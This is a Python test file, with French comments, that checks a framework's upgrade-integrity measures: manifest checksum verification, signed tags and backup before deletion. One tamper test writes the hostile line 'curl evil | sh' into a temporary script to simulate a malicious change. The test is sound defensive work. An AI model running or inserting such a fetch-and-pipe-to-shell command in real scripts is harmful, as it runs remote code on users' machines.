"""
C3 — Intégrité du framework à l'upgrade

hub-release.sh génère patch/checksums.sha256 (fichiers trackés git) ;
upgrade.sh vérifie le manifest et abandonne en cas d'écart, archive
l'état courant dans removed/ avant remplacement.
"""
import os
import subprocess

BASE = os.path.join(os.path.dirname(__file__), '..')


def _read(rel):
    with open(os.path.join(BASE, rel), encoding="utf-8") as f:
        return f.read()


class TestUpgradeScript:
    def test_verifies_manifest_and_aborts(self):
        src = _read("patch/upgrade.sh")
        assert "sha256sum --quiet -c patch/checksums.sha256" in src
        assert "ABANDONNÉE" in src
        assert "MA_UPGRADE_STRICT" in src

    def test_detects_files_outside_manifest(self):
        src = _read("patch/upgrade.sh")
        assert "comm -23" in src
        assert "hors manifest" in src

    def test_verifies_tag_signature(self):
        src = _read("patch/upgrade.sh")
        assert "verify-tag" in src

    def test_backup_before_delete(self):
        src = _read("patch/upgrade.sh")
        backup_pos = src.index("_upgrade_backup")
        # rsync d'application (-a), pas le dry-run (-rn) plus haut dans le script
        delete_pos = src.index("$RSYNC_CMD -a --delete")
        assert backup_pos < delete_pos
        assert "./removed/" in src


class TestReleaseScript:
    def test_generates_manifest_from_git_tracked_files(self):
        src = _read("patch/hub-release.sh")
        assert "git ls-files -z" in src
        assert "> patch/checksums.sha256" in src
        assert "':!patch/checksums.sha256'" in src
        assert "git add patch/checksums.sha256" in src

    def test_signs_tag_when_key_configured(self):
        src = _read("patch/hub-release.sh")
        assert "user.signingkey" in src
        assert 'TAG_SIGN_FLAG="-s"' in src


class TestManifestRoundTrip:
    """Le pipeline de vérification détecte réellement une altération."""

    def test_tamper_detected(self, tmp_path):
        f = tmp_path / "scripts.sh"
        f.write_text("echo ok\n")
        manifest = tmp_path / "checksums.sha256"
        out = subprocess.run(["sha256sum", "scripts.sh"], cwd=tmp_path,
                             capture_output=True, text=True, check=True)
        manifest.write_text(out.stdout)

        ok = subprocess.run(["sha256sum", "--quiet", "-c", "checksums.sha256"],
                            cwd=tmp_path, capture_output=True)
        assert ok.returncode == 0

        f.write_text("echo ok\ncurl evil | sh\n")
        bad = subprocess.run(["sha256sum", "--quiet", "-c", "checksums.sha256"],
                             cwd=tmp_path, capture_output=True)
        assert bad.returncode != 0
